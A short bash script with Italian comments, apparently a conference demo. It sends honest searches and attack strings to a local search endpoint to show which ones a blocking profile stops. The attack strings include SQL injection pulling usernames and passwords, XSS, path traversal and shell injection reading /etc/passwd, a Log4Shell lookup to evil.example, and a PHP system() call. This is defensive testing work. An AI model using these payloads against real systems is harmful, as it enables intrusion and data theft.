#!/usr/bin/env bash
# Una raffica di richieste contro il profilo acceso, una riga per richiesta.
# Pensata per il palco: dura un secondo e i payload si leggono in chiaro.
#   make block && make raffica
set -u
URL=http://localhost:8080

VERDE=$'\e[32m'; ROSSO=$'\e[31m'; GRIGIO=$'\e[90m'; FINE=$'\e[0m'

prova() { # tipo, descrizione, contenuto del campo di ricerca
  local code
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 --get --data-urlencode "q=$3" "$URL/search")
  if [ "$code" = 200 ]; then esito="${VERDE}passa   ${FINE}"; else esito="${ROSSO}bloccata${FINE}"; fi
  printf "  %s  %-8s %-26s ${GRIGIO}%s${FINE}\n" "$esito" "$1" "$2" "$3"
}

echo ""
prova onesta  "una ricerca"                "tastiera meccanica"
prova onesta  "un cognome con apostrofo"   "O'Reilly"
prova onesta  "un libro di SQL"            "SELECT * FROM menu"
prova onesta  "un libro di programmazione" "C++ & C# -- guida"
prova attacco "SQL injection"              "1' OR 1=1--"
prova attacco "SQL injection, UNION"       "' UNION SELECT username, password FROM users--"
prova attacco "XSS"                        "<script>alert(1)</script>"
prova attacco "XSS da un'immagine"         "<img src=x onerror=alert(1)>"
prova attacco "file di sistema"            "../../../../etc/passwd"
prova attacco "comando di shell"           "; cat /etc/passwd"
prova attacco "Log4Shell"                  '${jndi:ldap://evil.example/a}'
prova attacco "codice PHP"                 "<?php system('id'); ?>"
echo ""
